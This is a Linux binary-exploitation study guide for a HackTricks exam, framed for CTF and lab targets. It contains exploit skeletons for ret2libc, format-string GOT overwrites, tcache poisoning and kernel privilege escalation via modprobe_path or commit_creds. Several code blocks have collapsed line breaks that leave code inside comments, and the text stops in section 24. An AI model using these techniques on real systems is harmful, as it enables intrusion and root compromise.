---
title:       "LEE Exam"
summary:     "HACKTRICKS LEE - LINUX EXPLOITATION EXPERT"
category:    "HackTricks"
tags:        [lee, hacktricks]
updated:     2026-07-27
---

## LEE Master Field Guide — Linux Exploitation Expert (HackTricks)

The large, in-depth educational study companion for the HackTricks **Linux Exploitation Expert (LEE)** path. Binary-exploitation learning reference across workflow/tooling → x86\_64 userland → heap → AArch64 → kernel → V8/browser. For each area: **how it works (mechanism) → the standard workflow & tools → the named techniques with illustrative teaching snippets → debugging tips & pitfalls.** Oriented to **CTF binaries, lab VMs, and the exam**.

> **How to use this:** a *map, vocabulary, and methodology* for learning exploit development against intentionally-vulnerable practice targets. Snippets are the classic teaching patterns the public corpus (HackTricks, how2heap, ROP Emporium, pwn.college, Nightmare) uses — meant to be built and run in a disposable VM / CTF sandbox you own. It explains how bug classes and techniques work; it is not a set of turnkey exploits for real-world systems. ⚠️ **Authorized / lab use only.** Exploit development is legitimate as CTF practice, coursework, and vulnerability research on targets you own or are permitted to test.

---

## Table of Contents

1. Setup & Tools for Binary Exploitation
2. The GDB / pwndbg Debugging Workflow
3. x86\_64 Fundamentals
4. Mitigations & How They're Bypassed
5. Stack-Based Buffer Overflow
6. ROP Techniques
7. ret2dlresolve
8. Format-String Exploitation
9. Arbitrary Code Execution in Modern glibc
10. Heap Fundamentals
11. glibc Heap Implementation (tcache & bins)
12. glibc Heap Exploitation
13. Other Heap Implementations
14. AArch64 (ARM64) Fundamentals
15. AArch64 Stack Overflow & Mitigations
16. Linux Kernel Fundamentals
17. Kernel Exploitation Fundamentals
18. Kernel Stack & Heap Bugs
19. Kernel Page-Level & Privesc Primitives
20. V8 / Browser Fundamentals
21. V8 Exploitation & JIT Concepts
22. The V8 Heap Sandbox
23. Worked Conceptual Walkthroughs (practice binaries)
24. Reverse Engineering & Crash Analysis
25. Shellcode & pwntools shellcraft
26. Advanced ROP — ret2csu, SROP, GOT/unlink
27. Advanced Primitives Across Targets
28. Debugging, Pitfalls & Reliability
29. Study Path & Practice Targets
30. Workflow Checklists, Tooling & Glossary

---

## 1. Setup & Tools for Binary Exploitation

**Environment:** a disposable Linux VM. Match the target's **glibc version and architecture** where you can — heap layouts and gadget offsets differ per libc build, so an exploit tuned to one libc often won't fire on another. Keep a small library of libc binaries + their matching loaders for local testing (`pwninit`/`patchelf` help you bind a challenge binary to a specific libc/loader).

```bash
sudo apt install gdb gcc gcc-multilib python3-pip qemu-user qemu-system binutils file
pip install pwntools ropgadget
# GDB enhancer (pick ONE): pwndbg (recommended), GEF, or peda
git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh
# helpers
pip install pwntools && sudo apt install elfutils
# one_gadget (ruby): gem install one_gadget
# pwninit: cargo install pwninit    (auto-patches a chall to a given libc/loader)
```

**Always recon the binary first — this dictates the whole approach:**

```bash
file ./chall                     # arch, static vs dynamic, stripped?
checksec --file=./chall          # NX / PIE / Canary / RELRO / Fortify
rabin2 -I ./chall                # (radare2) same info, more detail
strings -a ./chall | less        # /bin/sh, format strings, hints
nm ./chall ; readelf -a ./chall  # symbols, PLT/GOT, sections, .dynamic
ldd ./chall                      # which libc; note exact version (getconf GNU_LIBC_VERSION)
ROPgadget --binary ./chall > gadgets.txt   # or ropper -f ./chall
one_gadget ./libc.so.6           # magic execve one-shots for THIS libc
strace -f ./chall ; ltrace -f ./chall      # syscalls / libcalls at runtime
```

**The reusable pwntools harness** (start every challenge from this):

```python
from pwn import *
exe = context.binary = ELF('./chall')
libc = ELF('./libc.so.6')
context.terminal = ['tmux','splitw','-h']   # gdb opens in a split
gs = '''
b *main
continue
'''
def start():
    if args.REMOTE: return remote('host', 1337)
    if args.GDB:    return gdb.debug(exe.path, gdbscript=gs)
    return process(exe.path)

io = start()
# helper: leak parser
def u(x): return u64(x.ljust(8, b'\x00'))
# ... build & send payload ...
io.interactive()
```

Run it as `python xpl.py GDB` (debug), `python xpl.py` (local), `python xpl.py REMOTE` (exam/CTF).

---

## 2. The GDB / pwndbg Debugging Workflow

You live in the debugger. The pwndbg commands you'll use constantly:

```text
b *0x401234 / b main         set breakpoints (address or symbol)
r / c / si / ni / finish     run / continue / step-in / step-over / run-to-return
context                      registers + stack + disasm + backtrace (pwndbg auto-shows)
x/20gx $rsp                  examine 20 giant (8-byte) hex words at the stack pointer
telescope $rsp 30            pwndbg: dereference-chase the stack (great for finding leaks/offsets)
vmmap                        memory map (find libc/stack/heap base, permissions)
p system / p &__free_hook    resolve symbol addresses
search -s "/bin/sh"          find a string in memory
cyclic 200 / cyclic -l ...   pattern create / locate offset
heap / bins / arena          pwndbg heap inspection (chunks & free-lists)
canary                       show the current stack canary value
got / plt                    dump GOT/PLT entries
ropgadget / rop              gadget search inside gdb
```

**Core debugging moves:**

- **Find an overflow offset:** send `cyclic(200)`, let it crash, read the faulting value from `context`, `cyclic -l <value>` → offset.
- **Find a leak's stack index (format string):** send `AAAA.%p.%p...`, see which `%p` prints `0x41414141`.
- **Confirm a control-flow hijack:** overwrite the saved RIP with `0xdeadbeefdeadbeef`, `c`, verify `RIP=0xdead...` in `context`.
- **Compute libc base at runtime:** `vmmap` shows the libc load address; subtract a known symbol offset to sanity-check your leak math.

---

## 3. x86\_64 Fundamentals

**Registers:** general-purpose `rax rbx rcx rdx rsi rdi rbp rsp r8–r15`; `rip` = instruction pointer. `rsp` = stack top, `rbp` = frame base. 32-bit sub-registers: `eax`, etc. **System V AMD64 calling convention:** integer/pointer args go in `rdi, rsi, rdx, rcx, r8, r9`, then the stack; the return value is in `rax`. This is why "set `rdi` to a `/bin/sh` pointer, then call `system`" is the canonical finisher — you're just satisfying the ABI. **The stack** grows **downward** (toward lower addresses). A `call` pushes the 8-byte return address; a function prologue typically does `push rbp; mov rbp, rsp; sub rsp, N` to save the caller's frame and allocate locals. Overwriting the **saved return address** (just above the saved `rbp`) is the classic hijack — on `ret`, the CPU pops your value into `rip`. **Syscalls:** the `syscall` instruction; number in `rax`, args in `rdi, rsi, rdx, r10, r8, r9` (note `r10`, not `rcx`, for the 4th). Useful numbers: `execve`=59, `read`=0, `write`=1, `open`=2, `mprotect`=10. **PLT/GOT (dynamic linking):** an external call like `printf` jumps to its **PLT** stub, which reads the function's real address from the **GOT**. By default resolution is **lazy** (first call resolves via `_dl_runtime_resolve`), which is exactly what **ret2dlresolve** abuses; and a writable GOT (partial RELRO) is what **GOT-overwrite** abuses. **Endianness:** x86 is little-endian — `p64()` in pwntools handles byte order for you.

---

## 4. Mitigations & How They're Bypassed

Understanding *why* each mitigation exists tells you the bypass class.

| Mitigation | Mechanism | Bypass class (concept) |
|---|---|---|
| **NX / DEP** | Stack & heap pages non-executable | Don't inject shellcode — **reuse existing code**: ROP, ret2libc, ret2syscall. |
| **ASLR** | Randomizes libc/stack/heap base each run | **Leak** an address (format string, UAF, unsorted-bin fd) → compute the base. |
| **PIE** | Randomizes the *binary's* base too | Leak a code/GOT pointer to recover the base; or use position-independent tricks (PLT, partial pointer overwrites). |
| **Stack canary** | Random value between locals and saved RIP; checked on return | **Leak** it (format string / OOB read) and re-supply it; or overwrite non-canary targets; brute per-byte in forking servers (canary unchanged across forks). |
| **Full RELRO** | GOT resolved at load, made read-only | Can't overwrite GOT — pivot to writable targets (hooks in old glibc; **FSOP** on a FILE struct now). |
| **FORTIFY** | Adds bounds-checked libc variants | Constrains some overflows/format strings; find unfortified paths. |
| **CET / shadow stack** | Hardware CFI + return-address shadow | Constrains ROP on new CPUs; mostly out of scope for CTF but know it exists. |

**The universal modern flow:** **leak (defeat ASLR) → compute base → build primitive (ROP / arbitrary write) → finish (shell)**. Almost every exploit opens with an info leak because you can't target anything randomized without one.

---

## 5. Stack-Based Buffer Overflow

**Mechanism:** an unbounded write (`gets`, oversized `read`, `strcpy`, `sprintf`) spills past a stack buffer into adjacent stack slots — including the saved `rbp` and saved return address. Control the return address → control `rip` on function return.

**Methodology:**

1. **Find the offset** to the saved return address.
  ```python
  payload = cyclic(200)               # send it, crash# from the fault (pwndbg shows the value in RIP/RSP):# cyclic -l 0x6161616c   ->  e.g. 72offset = 72
  ```
2. **Confirm control:** `payload = b'A'*offset + p64(0xdeadbeefdeadbeef)` → `RIP` should read that value.
3. **ret2win (teaching):** overwrite RIP with a target function's address.
  ```python
  payload = flat({offset: exe.symbols['win']})io.sendline(payload)
  ```
4. **Stack alignment gotcha:** glibc `system`/`printf` use `movaps`, which faults on a misaligned stack. If a ret2libc crashes inside libc, prepend a lone `ret` gadget to re-align to 16 bytes:
  ```python
  ret = ROP(exe).find_gadget(['ret'])[0]payload = flat({offset: [ret, exe.symbols['win']]})
  ```
5. With canary/NX/PIE on, combine with a **leak** (§8) and **ROP** (§6).

**Variations:** overflow into a saved `rbp` for a **stack pivot** later; partial overwrite of the return address to reach a nearby code path without knowing the full base (defeats PIE cheaply when only the low bytes matter).

---

## 6. ROP Techniques

**Mechanism (Return-Oriented Programming):** with NX preventing shellcode, you build a payload of stack-resident **addresses of "gadgets"** — short instruction sequences already in the binary/libc that end in `ret`. Each gadget does a tiny bit of work, then `ret` pops the next gadget address. Chaining them lets you set registers and call functions — usually to run a shell.

**Find gadgets:**

```bash
ROPgadget --binary ./chall | grep -E ': pop rdi ; ret'
ropper -f ./libc.so.6 --search "pop rdi; ret"
ropper -f ./libc.so.6 --search "pop rsi; pop r15; ret"
```

**Canonical chains (concept + skeleton):**

- **ret2libc** — leak a libc address, compute libc base, then call `system("/bin/sh")`:
  ```python
  libc.address = leak - libc.symbols['puts']      # rebase libc from a leaked puts@GLIBCrop = ROP(libc)rop.raw(rop.find_gadget(['ret'])[0])            # 16-byte alignmentrop.system(next(libc.search(b'/bin/sh\x00')))payload = flat({offset: rop.chain()})
  ```
- **ret2syscall** — set `rax=59` (execve), `rdi=&"/bin/sh"`, `rsi=rdx=0`, then a `syscall` gadget. Ideal for **static** binaries (no libc to leak). Find `pop rax; ret` and `syscall; ret` gadgets.
- **Leak-then-return (two-stage):** stage 1 calls `puts(puts@got)` to leak libc, then returns to `main` to send stage 2 with the now-known libc base:
  ```python
  rop = ROP(exe)rop.puts(exe.got['puts'])       # leakrop.call(exe.symbols['main'])   # loop back for stage 2
  ```
- **Stack pivot** — when the overflow is too small for a full chain, redirect `rsp` into a larger buffer you control (`leave; ret` sets `rsp=rbp; pop rbp; ret`; or `xchg rsp, rax; ret`), then run the real chain there.
- **SROP (SigReturn-Oriented Programming)** — abuse `sigreturn` to set *all* registers at once from a forged signal frame; handy when gadgets are scarce (`pwntools SigreturnFrame`).

**pwntools does the plumbing** — but the exam expects you to explain what each gadget does and why the chain satisfies the ABI.

---

## 7. ret2dlresolve

**Mechanism:** on a lazily-bound binary, the first call to an imported function runs `_dl_runtime_resolve(link_map, reloc_index)`, which reads relocation/symbol/string-table entries to find the function, then calls it. If you can **forge** those structures (a fake `Elf64_Rel`, `Elf64_Sym`, and a string like `"system"`) in a writable, known location and jump to the PLT-0 resolver stub with your fake `reloc_index`, the loader resolves and **calls a function of your choosing** — with **no libc leak** needed. Best on **no-PIE, Partial RELRO, no-leak** targets.

**pwntools automates the structure-forging:**

```python
rop = ROP(exe)
dl  = Ret2dlresolvePayload(exe, symbol='system', args=['/bin/sh'])
rop.read(0, dl.data_addr)     # read our fake structs into a writable area
rop.ret2dlresolve(dl)         # jump to the resolver with the crafted index
payload = flat({offset: rop.chain(), dl.data_addr: dl.payload})   # (layout varies)
```

Do the manual version once against a teaching binary to internalize `.dynamic`, `.rela.plt`, `.dynsym`, `.dynstr` and how `reloc_index` selects a relocation — the exam tests the concept.

---

## 8. Format-String Exploitation

**Mechanism:** `printf(user_controlled)` (no format specifier) lets your input be *interpreted* as a format string. `%p`/`%x`/`%s` **read** from the varargs region (i.e., the stack and pointers you place there); `%n` **writes** the number of bytes printed so far to an address taken from the args — an **arbitrary write** primitive.

**Step 1 — locate your controlled arg index:**

```python
io.sendline(b'AAAABBBB' + b'.%p'*20)    # find where 0x41414141.. appears -> that's index N
```

**Step 2 — leak (defeat ASLR / read the canary):**

```python
io.sendline(b'%15$p.%17$p')             # read specific stack slots (libc ptr, canary, etc.)
```

**Step 3 — arbitrary write with**`%n`**(pwntools helper):**

```python
# overwrite a GOT entry (partial RELRO) to redirect a later call:
payload = fmtstr_payload(offset, {exe.got['exit']: exe.symbols['win']})
io.sendline(payload)
```

**Precision writes:** `%hn` writes 2 bytes, `%hhn` writes 1 byte — build a full 8-byte pointer with several staged writes to avoid printing billions of characters. Common targets: a **GOT entry**, a **saved return address**, `__malloc_hook`/`__free_hook` (old glibc), or a **FILE vtable** (modern).

**Why it's powerful:** a single format-string bug often gives *both* a leak and an arbitrary write — enough to fully exploit on its own.

---

## 9. Arbitrary Code Execution in Modern glibc

**The shift:** classic CTF finishers overwrote `__malloc_hook`/`__free_hook` so the next `malloc`/`free` jumped to a **one\_gadget**. glibc ≥2.34 **removed those hooks**, so from an arbitrary write you now pivot to **file-stream–oriented** techniques.

**one\_gadget** — a single libc address that `execve("/bin/sh",…)` if its constraints (certain registers zero, stack state) hold at call time:

```bash
one_gadget ./libc.so.6        # lists candidates + their constraints
```

Point a redirected call (a remaining hook, a FILE vtable entry, `__run_exit_handlers`) at whichever one\_gadget's constraints your context satisfies.

**FSOP / "House of Apple" family (concept):** forge a `_IO_FILE` structure — its **vtable** (and, in the newer variants, `_wide_data`/`_wide_vtable`) — so that a normal stream operation (buffer flush on `exit`, `fclose`, `puts`) dispatches through your controlled pointer, giving ACE **without hooks**. Modern glibc validates the vtable is within the known vtable region, so the technique uses fields the check doesn't cover (hence "House of Apple 2", `_IO_wfile_jumps`, etc.). Key study targets: the `_IO_FILE_plus` layout, `_IO_list_all`, and the `_IO_flush_all` path taken on `exit`.

**Exam takeaway:** from *any* arbitrary write in modern glibc, the standard finisher is **FSOP → one\_gadget/**`system`; know the FILE-structure fields involved and why the vtable check is bypassed.

---

## 10. Heap Fundamentals

**Mechanism:** `malloc`/`free` manage the heap as a set of **chunks** carrying in-band metadata; freed chunks are recycled via **bins** (free-lists). Because metadata and free-list pointers live next to (or inside) user data, a UAF/overflow/double-free lets you **forge** them and make `malloc` hand back a pointer you control.

**Chunk layout (allocated):** `[ prev_size ][ size | A|M|P flags ][ ...user data... ]` where the low bits of `size` are `PREV_INUSE (P)`, `IS_MMAPPED (M)`, `NON_MAIN_ARENA (A)`. **Chunk layout (free):** the user area is repurposed for free-list pointers `fd`/`bk` (and, in large bins, `fd_nextsize`/`bk_nextsize`). **Why exploitable:** the allocator trusts these fields. Control them → control where the next allocation lands (aim it at a hook, GOT, or FILE struct).

---

## 11. glibc Heap Implementation (tcache & bins)

**The free-lists, fastest → slowest:**

- **tcache** (glibc ≥2.26) — per-thread cache; **singly-linked**, LIFO, default 7 chunks per size class. The primary CTF target: historically minimal integrity checks, so `fd` corruption directly aims the next allocation. Modern glibc adds **safe-linking** (the `fd` is XOR-mangled with `addr>>12`) and a per-chunk **key** to catch double-frees — so you often need a **heap leak** to forge a valid mangled `fd`.
- **fastbins** — small sizes, singly-linked LIFO; a size check on the reinserted chunk.
- **unsorted bin** — a doubly-linked staging list; a freed chunk here has `fd`/`bk` pointing into libc's `main_arena` → reading it **leaks libc** (defeats ASLR). This is the #1 heap leak source.
- **small / large bins** — sorted doubly-linked lists; `unlink` integrity checks matter here.
- **top chunk (wilderness)** — the unallocated remainder the heap grows from.

**Two facts that drive most heap exploits:**

1. Freeing a chunk into the **unsorted bin** and then reading it leaks a **libc** pointer.
2. Corrupting a **tcache/fastbin**`fd` aims the **next allocation** at an address you choose → arbitrary write.

---

## 12. glibc Heap Exploitation

The classic primitives (as taught in **how2heap**, against practice binaries):

- **Use-After-Free (UAF):** keep using a pointer after `free`; if you can reallocate the freed slot as a *different* type, you get type confusion / overlapping objects (e.g., control a function pointer inside the reused object).
- **Double free:** free the same chunk twice. On fastbins/tcache this loops the free-list onto itself, so subsequent allocations return **overlapping** memory. tcache's per-chunk **key** detects the naive case, so techniques (e.g., **House of Botcake**) cycle a chunk through different bins first to evade the check.
- **tcache poisoning (the workhorse):**
  ```text
  1. alloc A, B (same size)2. free A, free B            # tcache: head -> B -> A3. via UAF/overflow, overwrite B.fd with (target ^ (heap>>12))   # safe-linking mangle4. malloc  -> returns B5. malloc  -> returns *target*   # write anything here (FILE struct, remaining hook, GOT if partial RELRO)
  ```
  Requires a **heap leak** for the safe-linking mangle on modern glibc.
- **House-of-X family (know which live in which glibc):** *House of Force* (top-chunk size overwrite — dead in new glibc), *House of Spirit* (free a fake chunk into fastbin/tcache), *House of Einherjar* (prev-size/consolidation abuse), *House of Botcake* (tcache double-free evasion), *House of Apple 2* (FSOP finisher from a heap write).

**Standard heap-exploit flow:**

```
leak libc (unsorted-bin fd)  ->  leak heap base (a heap pointer, for safe-linking)
   ->  arbitrary write (tcache poisoning)  ->  finish (FSOP -> one_gadget/system, §9)
```

---

## 13. Other Heap Implementations

Awareness for breadth:

- **musl libc (mallocng)** — different metadata (out-of-band, grouped) and integrity model than glibc; techniques center on the meta structures and group headers.
- **jemalloc / tcmalloc** — size-class + arena/thread-cache designs used by some apps and browsers; exploitation reasons about size classes, spans, and thread caches.
- **dlmalloc / ptmalloc2** — the ancestors; simpler in-band metadata, classic `unlink`-style attacks. **Transferable method:** identify the allocator → learn its chunk/metadata + free-list model → apply the same *shape* (forge metadata → controlled allocation → arbitrary write → finisher).

---

## 14. AArch64 (ARM64) Fundamentals

**Registers:** `x0–x30` (64-bit; `w0–w30` = 32-bit views), `sp`, `pc`. `x30` = **LR (link register)** holds the return address; `x29` = frame pointer. Args in `x0–x7`, return in `x0`. Fixed-width **4-byte instructions**. **Control-flow difference vs x86:** `bl func` puts the return address in **LR (x30)**, not on the stack. A *leaf* function that never touches the stack keeps the return address only in `x30`. But **non-leaf** functions save it: the prologue does `stp x29, x30, [sp, #-N]!` and the epilogue `ldp x29, x30, [sp], #N ; ret` — so a **stack overflow that overwrites the saved**`x30` still hijacks control on `ret` (which branches to `x30`). **Syscalls:** `svc #0`; number in `x8`, args in `x0–x5`. **Run & debug:**

```bash
qemu-aarch64 -L /usr/aarch64-linux-gnu ./chall_arm64            # run
qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./chall_arm64    # debug stub
gdb-multiarch ./chall_arm64 -ex 'target remote :1234'
```

---

## 15. AArch64 Stack Overflow & Mitigations

**Overflow → control:** overwrite the saved `x29/x30` pair on the stack; the epilogue's `ldp ...; ret` loads your value into `x30` and `ret` branches there. **ROP on ARM** chains gadgets that end in `ret`; useful gadgets **load registers from the stack** (e.g., `ldp x19,x20,[sp],#N ; ... ; ret`) so you can set arguments before a call. Because instructions are fixed-width and aligned, you can't jump "mid-instruction" like on x86 — the gadget set is different in character.

**Advanced mitigations (major exam concepts):**

- **PAC (Pointer Authentication):** the CPU signs pointers (including return addresses via `paciasp`) with a per-process key stored in upper pointer bits; `autiasp` verifies on use, faulting if tampered. This directly breaks naive return-address overwrite. Study angles: signing-oracle leaks, reusing a validly-signed pointer, or paths that don't PAC-protect.
- **BTI (Branch Target Identification):** indirect branches must land on a `bti` "landing pad" instruction — shrinks the usable gadget set for indirect-call reuse.
- **MTE (Memory Tagging):** allocations and pointers carry 4-bit tags; a mismatched access faults — raises the bar on heap/stack corruption (probabilistic without a tag leak).

---

## 16. Linux Kernel Fundamentals

**Mechanism:** the kernel runs at high privilege; unprivileged user programs enter it via **syscalls** and talk to **drivers** through `open`/`read`/`write`/`ioctl` on device files (`/dev/...`). Kernel CTF/labs ship a **vulnerable module** (`.ko`) and a QEMU VM, and ask you to escalate from an unprivileged shell to **root** by abusing the module. **Key structures:** `task_struct` (per process) contains a pointer to `cred` (holds `uid/gid/euid/…`). Rooting a task usually means making its `cred` have `uid=0` (directly or via `commit_creds`). **Lab loop — build, pack, run:**

```bash
# unpack the provided initramfs, add your compiled exploit, repack, boot
mkdir fs && cd fs && zcat ../initramfs.cpio.gz | cpio -idmv
cp ../exploit .                                   # static-compile: gcc -static -o exploit exploit.c
find . -print0 | cpio --null -o -H newc | gzip > ../new.cpio.gz
cd .. && qemu-system-x86_64 -kernel bzImage -initrd new.cpio.gz -nographic \
   -append "console=ttyS0 quiet nokaslr" -m 256M    # drop nokaslr once your leak works
```

Interact with the module from C via `open("/dev/vuln")` + `ioctl(...)`.

---

## 17. Kernel Exploitation Fundamentals

**Goal:** turn a kernel memory-corruption or R/W primitive into **root**. Two finisher styles:

- **Call-based:** if you get a controlled call, run `commit_creds(prepare_kernel_cred(NULL))` — this hands your task fresh root credentials.
  ```c
  // resolve these kernel symbols (from /proc/kallsyms if readable, or a leak + offset)commit_creds(prepare_kernel_cred(NULL));   // now uid=0// then return to userland and exec a shell
  ```
- **Data-only (preferred under CFI):**
  - Overwrite `modprobe_path` (a kernel global string, normally `/sbin/modprobe`) to point at a script you control; then trigger a modprobe (run a file with an unknown magic) → your script runs **as root**.
  - Or directly overwrite your task's `cred.uid/gid` to 0 via a kernel write primitive.

**Mitigations & bypass classes (reason about each):**

| Mitigation | Effect | Bypass class |
|---|---|---|
| **KASLR** | Randomizes kernel base | Leak a kernel pointer (`dmesg`, uninitialized read, timing) → compute base. |
| **SMEP** | Kernel can't execute user pages | Stay in kernel memory — **kernel ROP**, don't jump to user shellcode. |
| **SMAP** | Kernel can't read/write user pages ad-hoc | Place data in kernel memory; use copy primitives / pivot. |
| **KPTI** | Separate user/kernel page tables | Use a correct **return-to-user** trampoline (`swapgs; iretq` with saved user CS/SS/RSP/RFLAGS). |
| **CFI / kCFI** | Constrains indirect calls | Prefer **data-only** (`modprobe_path`, cred overwrite). |
| **STACKPROTECTOR** | Kernel stack canary | Leak/avoid it, like userland. |

**Return-to-user (concept):** after gaining root creds mid-exploit, restore the saved user segment selectors + flags and `iretq` back to a user function that `system("/bin/sh")`s (save these at the start with a small asm helper).

---

## 18. Kernel Stack & Heap Bugs

**Kernel stack overflow:** a bad size in `copy_from_user` (or a fixed kernel-stack buffer) overflows into a saved return address → **kernel ROP** → privesc finisher (§17) → return-to-user. A kernel **stack canary** usually guards this; leak or sidestep it.

**Kernel heap (SLUB/slab):** `kmalloc` serves from **size-class caches** (`kmalloc-32/64/…`). Core lab techniques:

- **UAF / double free** on a kernel object → **reclaim** the freed slot by spraying a **controllable object of the same size** via a syscall → overlap a sensitive field (a function pointer or `cred`).
- **Heap grooming/spray:** allocate/free in a pattern so your controlled object lands exactly where the freed victim was (slab is deterministic-ish per cache).
- **"Useful objects" (memorize what each gives):**
  - `msg_msg` — arbitrary-size alloc; **leak** + limited write.
  - `pipe_buffer` — function pointer (`ops`) → **control flow**.
  - `tty_struct` — `ops` pointer → leak + control.
  - `setxattr` / `add_key` — spray arbitrary bytes into a chosen cache.
  - `struct file`, `sk_buff` — assorted leak/control.

---

## 19. Kernel Page-Level & Privesc Primitives

**Page-level (advanced):** attacks at the **page allocator** granularity, used to defeat slab isolation and hardened allocators:

- **Cross-cache overflow:** free a slab page back to the page allocator, then get it **reallocated as a different cache**, so an overflow in cache A corrupts an object in the (normally isolated) cache B — often the only way to reach `cred`/pagetable objects on hardened kernels.
- **Page UAF:** a freed **page** gets reused as a **page table** (or another privileged structure); writing your "user data" then edits page-table entries → **arbitrary physical/virtual R/W** → trivially root.

**Privesc-primitive summary (what you're steering toward):**

1. **Arbitrary kernel R/W** — the strongest primitive; then overwrite `cred` or `modprobe_path`.
2. `modprobe_path`**overwrite** — most reliable data-only root (no CFI issues).
3. `cred.uid=0`**overwrite** — direct.
4. `commit_creds(prepare_kernel_cred(0))` — when you have a call primitive. Then **return-to-user** and pop a root shell.

---

## 20. V8 / Browser Fundamentals

**Why V8:** the JS engine in Chrome/Node is a marquee exam target — a *JavaScript-level* bug corrupts engine memory, and you build primitives entirely from JS. You need the object model:

- **Objects, Maps (hidden classes), Elements, Properties:** a **Map** encodes an object's *shape* (field layout, element kind). Many bugs are **type confusion** — the engine treats memory shaped by Map A as if it were Map B.
- **Element kinds:** `PACKED_SMI_ELEMENTS` → `PACKED_DOUBLE_ELEMENTS` → `PACKED_ELEMENTS` (a lattice); confusing a double array with an object array is a classic route to `addrOf`/`fakeobj`.
- **Tagged values & pointer compression:** values are either **SMIs** (small ints, tagged) or heap pointers; modern V8 stores **32-bit compressed** pointers within a 4 GB **cage**, with a base held in a register. **Study setup:**

```bash
fetch v8 && gclient sync && tools/dev/gm.py x64.release        # build d8
./out/x64.release/d8 --allow-natives-syntax poc.js            # %DebugPrint(obj), %SystemBreak()
```

Use `%DebugPrint` to inspect Maps/elements and confirm your corruption.

---

## 21. V8 Exploitation & JIT Concepts

**The two bootstrap primitives everyone builds:**

- `addrOf(obj)` — leak the in-heap address of a JS object (e.g., store the object into a confused float array and read it back as a double).
- `fakeobj(addr)` — materialize a fake object at an address you choose (the inverse — write a controlled double that the engine later treats as a pointer). From these you construct a stable **arbitrary read/write**, typically by corrupting a `TypedArray`/`ArrayBuffer`'s **backing-store pointer** so ordinary `arr[i]` reads/writes anywhere in the heap cage.

**JIT exploitation (concept):** the optimizing compiler (TurboFan/Maglev) makes **assumptions** (types, array bounds) to emit fast code. A bug that violates an assumption — stale type feedback, incorrect **bounds-check elimination**, an aliasing mistake — makes optimized code perform an out-of-bounds or type-confused access the interpreter never would, yielding a memory-corruption primitive from pure JS. Historically, RWX JIT code regions let you drop native shellcode; modern V8 hardens JIT memory (W^X, code-signing-ish checks), pushing exploits toward **data-only** and **sandbox-escape** routes.

**Teaching-shape flow:** JS bug → OOB/type confusion → `addrOf` + `fakeobj` → arbitrary R/W → (historically) code exec / (now) sandbox escape (§22).

---

## 22. The V8 Heap Sandbox

**Mechanism:** modern V8 adds a **heap sandbox** — the JS heap is confined to a bounded region and in-heap pointers are **compressed/typed**, so corrupting memory *inside* the sandbox can't directly forge a raw native pointer to *outside* it. Consequently, an arbitrary read/write **within** the sandbox is no longer automatically full process RCE. **Implication (the current exam frontier):** exploitation shifts to **sandbox escapes** — abusing objects/APIs whose backing store lives **outside** the sandbox (or "trusted"/external pointers the sandbox still exposes) to convert in-sandbox R/W into out-of-sandbox control. The mental model to carry: **arbitrary R/W in the cage is now a*****step*****, not the finish line** — understand precisely what the sandbox protects, what it deliberately doesn't, and which external-pointer objects are the escape surface.

---

## 23. Worked Conceptual Walkthroughs (practice binaries)

*Generic teaching walkthroughs against intentionally-vulnerable practice binaries (ROP Emporium / pwn.college style). Concept-level, to cement the methodology.*

**Walkthrough A — 64-bit ret2libc (NX on, no canary, no PIE).**

1. `checksec` → NX, no canary, no PIE, partial RELRO. Overflow via `gets`.
2. `cyclic` → offset 40 to saved RIP.
3. **Leak libc:** ROP `puts(puts@got)` then return to `main`. Parse the 6-byte leak, `libc.address = leak - libc.sym.puts`.
4. **Second stage:** now libc base is known — ROP `ret;` (align) → `system("/bin/sh")` using `next(libc.search(b'/bin/sh'))`.
5. Get a shell locally, then flip `REMOTE` for the exam server.

**Walkthrough B — tcache poisoning UAF (glibc 2.31, no PIE on the binary).**

1. Menu heap challenge: alloc/free/edit with a **UAF** (edit-after-free).
2. **Leak libc:** allocate a chunk large enough to skip tcache, free it → **unsorted bin** → its `fd` points into `main_arena`; read it back (UAF) → compute libc base.
3. **Arbitrary write:** two same-size chunks; free both into tcache; edit the freed head's `fd` to a chosen target (2.31 has no safe-linking); two allocations → the second returns the target.
4. **Finish:** write a **one\_gadget** over `__free_hook`, then `free()` a chunk whose data is `"/bin/sh"` → shell. (On ≥2.34 use **FSOP** instead — no `__free_hook`.)

**Walkthrough C — format string (leak + GOT overwrite).**

1. `printf(buf)` with no format → format-string bug. Find your arg index with `%p` spam.
2. Leak a libc pointer (`%N$p` on a stack slot holding a libc return address) → rebase libc.
3. `fmtstr_payload` to overwrite `printf@got` (partial RELRO) with `system`; next `printf(user)` with `user="/bin/sh"` runs `system("/bin/sh")`.

**Walkthrough D — kernel stack overflow (lab module).**

1. Reverse the `.ko`'s `ioctl` → a `copy_from_user` with an attacker-controlled length overflows a kernel stack buffer past the saved RIP.
2. Leak a kernel pointer (module or KASLR base) via an info-leak ioctl → defeat KASLR; leak the stack canary if present.
3. Build a **kernel ROP** chain: `commit_creds(prepare_kernel_cred(0))` (or `modprobe_path` overwrite), then a **return-to-user** trampoline (`swapgs; iretq` with saved user state).
4. Back in userland, `system("/bin/sh")` → root shell.

---

## 24. Reverse Engineering & Crash Analysis

**Why:** before you exploit, you must *understand* the target — find the vulnerable function, the input path, the buffer sizes, the structures. And the syllabus's "analyze crashes" means turning a raw fault into a diagnosis.

**Static RE workflow:**

```text
Ghidra (free) / IDA / Binary Ninja / radare2+cutter
 1. Load the binary; let auto-analysis run.
 2. Find input sinks: gets/read/recv/scanf/memcpy/strcpy/sprintf, malloc/free menus, ioctl handlers.
 3. Rename variables/functions as you understand them; annotate struct layouts.
 4. Trace attacker input from source (argv/stdin/socket/ioctl) to the dangerous sink.
 5. Note buffer sizes and the distance to saved RIP / to adjacent objects.
```

```bash
# quick radare2 recon
r2 -A ./chall
> afl            # list functions
> pdf @ main     # disassemble main
> axt sym.imp.system   # xrefs to system
> iz             # strings in data
```

**Dynamic RE & crash triage:**

```bash
# reproduce and classify a crash
gdb ./chall -ex run          # pwndbg 'context' shows the fault, registers, and the offending insn
dmesg | tail                 # segfault address + IP (userland)
# is RIP controlled? is it a read or write fault? at what address?
#   RIP = cyclic value      -> stack overflow -> control flow
#   write fault to attacker addr -> arbitrary-write primitive
#   read of freed object    -> UAF
```

**Fuzzing to*****find*****the bug (intro):**

```bash
# AFL++ on a source-available or instrumentable target
afl-cc -o chall_fuzz chall.c            # or afl-clang-lto / QEMU mode for binaries: afl-fuzz -Q
afl-fuzz -i seeds/ -o out/ ./chall_fuzz @@
# triage crashes:
